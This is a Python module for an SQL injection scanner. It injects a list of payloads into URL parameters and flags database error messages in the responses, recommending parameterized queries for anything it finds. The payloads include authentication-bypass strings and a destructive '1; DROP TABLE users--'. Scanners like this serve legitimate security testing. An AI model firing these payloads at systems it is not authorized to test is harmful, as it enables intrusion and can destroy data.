"""
SQL Injection Scanner
Tests URL parameters for common SQLi error-based responses.
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Common SQLi payloads to test
SQLI_PAYLOADS = [
    "'",
    "''",
    "`",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT NULL--",
    "admin'--",
    "1; DROP TABLE users--",
]

# DB error signatures that suggest SQLi vulnerability
ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "odbc microsoft",
    "ora-",
    "microsoft ole db provider for sql server",
    "syntax error",
    "pg_query()",
    "supplied argument is not a valid mysql",
    "column count doesn't match value count",
    "mysqli_",
    "sql syntax",
    "mysql_fetch",
    "invalid query",
]


def inject_payload(url: str, param: str, payload: str) -> str:
    """Inject payload into a URL parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def check_sqli(target: str, verbose: bool = False) -> list:
    findings = []
    parsed = urlparse(target)
    params = parse_qs(parsed.query)

    if not params:
        # Try appending a test parameter if none exist
        test_url = target + ("&" if "?" in target else "?") + "id=1"
        params = {"id": ["1"]}
        target = test_url
        if verbose:
            print(f"    [>] No params found, using test param: {test_url}")

    tested = set()

    for param in params:
        for payload in SQLI_PAYLOADS:
            test_url = inject_payload(target, param, payload)

            if test_url in tested:
                continue
            tested.add(test_url)

            try:
                response = requests.get(
                    test_url, timeout=8,
                    headers={"User-Agent": "WebSecMonitor/1.0"},
                    allow_redirects=True
                )
                body = response.text.lower()

                for sig in ERROR_SIGNATURES:
                    if sig in body:
                        finding = {
                            "type": "SQL Injection",
                            "severity": "CRITICAL",
                            "parameter": param,
                            "payload": payload,
                            "description": f"Possible SQL injection in parameter '{param}'. "
                                           f"Error signature detected: '{sig}'",
                            "recommendation": "Use parameterized queries / prepared statements. "
                                              "Never concatenate user input into SQL queries.",
                            "url": test_url
                        }
                        findings.append(finding)
                        print(f"    🔴 [CRITICAL] Possible SQLi in param '{param}' | Payload: {payload[:30]}")
                        if verbose:
                            print(f"        → Matched error signature: '{sig}'")
                            print(f"        → Test URL: {test_url}")
                        break

            except requests.exceptions.Timeout:
                if verbose:
                    print(f"    [>] Timeout on {test_url[:60]}")
            except Exception as e:
                if verbose:
                    print(f"    [>] Error: {e}")

    if not findings:
        print(f"    ✅ No obvious SQL injection errors detected")

    return findings
